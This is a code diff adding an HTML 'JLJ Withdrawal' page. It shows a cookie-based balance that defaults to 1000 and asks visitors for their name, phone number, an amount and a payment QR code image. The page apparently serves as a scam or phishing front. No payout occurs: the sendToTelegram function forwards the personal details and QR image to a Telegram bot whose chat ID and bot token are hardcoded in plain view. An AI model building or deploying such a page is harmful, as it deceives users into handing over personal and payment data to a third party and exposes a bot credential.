@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>JLJ Withdrawal</title>
+    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
+  </head>
+  <link rel="stylesheet" href="withdraw.css">
+  <body>
+    <h1>JLJ</h1>
+    <div class="balance">
+      <p>Balance: <span id="balance">Loading...</span></p>
+    </div>
+    <div class="form-container">
+      <form id="withdrawalForm">
+        <input type="text" id="name" placeholder="Your Name" required />
+        <input type="text" id="phone" placeholder="Phone Number" required />
+        <input
+          type="number"
+          id="amount"
+          placeholder="Withdrawal Amount"
+          required
+          min="1"
+        />
+        <input type="file" id="qrCode" accept="image/png, image/jpeg" required />
+        <button type="submit">Withdraw</button>
+      </form>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+      <h2>Request Sent!</h2>
+      <p>Your withdrawal request has been successfully submitted.</p>
+      <button id="okButton">OK</button>
+    </div>
+
+    <script>
+      // Cookie management functions
+      function getCookie(name) {
+        let match = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
+        return match ? match[2] : null;
+      }
+
+      function setCookie(name, value, days) {
+        let expires = new Date();
+        expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
+        document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
+      }
+
+      // Initialize balance
+      const balanceSpan = document.getElementById("balance");
+      const balance = getCookie("balance") ? parseFloat(getCookie("balance")) : 1000;
+      balanceSpan.textContent = balance.toFixed(2);
+
+      // Handle form submission
+      document.getElementById("withdrawalForm").addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const name = document.getElementById("name").value;
+        const phone = document.getElementById("phone").value;
+        const amount = parseFloat(document.getElementById("amount").value);
+        const qrCodeFile = document.getElementById("qrCode").files[0];
+
+        // Check if withdrawal amount is valid
+        if (amount > balance) {
+          alert("Insufficient balance. Please enter a lower amount.");
+          return;
+        }
+
+        // Validate QR code
+        const isValidQR = await validateQRCode(qrCodeFile);
+        if (!isValidQR) {
+          alert("Please upload a valid QR code image.");
+          return;
+        }
+
+        // Simulate balance deduction
+        const newBalance = balance - amount;
+        setCookie("balance", newBalance, 7);
+        balanceSpan.textContent = newBalance.toFixed(2);
+
+        // Send data to Telegram
+        sendToTelegram(name, phone, amount, qrCodeFile);
+
+        // Show success popup
+        document.getElementById("popup").style.display = "block";
+        document.getElementById("overlay").style.display = "block";
+      });
+
+      // Close popup
+      document.getElementById("okButton").addEventListener("click", function () {
+        document.getElementById("popup").style.display = "none";
+        document.getElementById("overlay").style.display = "none";
+      });
+
+      // Validate uploaded QR code image
+      function validateQRCode(file) {
+        return new Promise((resolve) => {
+          if (!file) {
+            resolve(false);
+            return;
+          }
+
+          const reader = new FileReader();
+          reader.onload = function (e) {
+            const image = new Image();
+            image.src = e.target.result;
+
+            image.onload = function () {
+              const canvas = document.createElement("canvas");
+              const context = canvas.getContext("2d");
+
+              canvas.width = image.width;
+              canvas.height = image.height;
+              context.drawImage(image, 0, 0);
+
+              const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+              const qrCode = jsQR(imageData.data, canvas.width, canvas.height);
+
+              resolve(!!qrCode);
+            };
+          };
+
+          reader.readAsDataURL(file);
+        });
+      }
+
+      // Send data to Telegram
+      function sendToTelegram(name, phone, amount, qrCodeFile) {
+        const chatId = "5786268361"; // Replace with your Telegram chat ID
+        const botToken = "7769361866:AAE5mLkwPGOOR8yaY-NgeOew0EpXei7y7W4"; // Replace with your Telegram bot token
+
+        // First, send the text message
+        const message = `🔔 Withdrawal Request:\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💵 Amount: ${amount}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.ok) {
+              console.log("Message sent successfully:", data);
+
+              // Proceed to send the image (QR code file)
+              const formData = new FormData();
+              formData.append("chat_id", chatId);
+              formData.append("photo", qrCodeFile);
+
+              fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData,
+              })
+                .then((imageResponse) => imageResponse.json())
+                .then((imageData) => {
+                  if (imageData.ok) {
+                    console.log("Image sent successfully:", imageData);
+                    alert("Withdrawal request submitted successfully!");
+                  } else {
+                    console.error("Image upload failed:", imageData.description);
+                    alert("Image upload failed. Please try again.");
+                  }
+                })
+                .catch((error) => {
+                  console.error("Error sending image:", error);
+                  alert("Error while uploading the QR code image.");
+                });
+            } else {
+              console.error("Message sending failed:", data.description);
+              alert("Message sending failed. Please try again.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error sending message:", error);
+            alert("Error while submitting the withdrawal request.");
+          });
+      }
+    </script>
+  </body>
+</html>
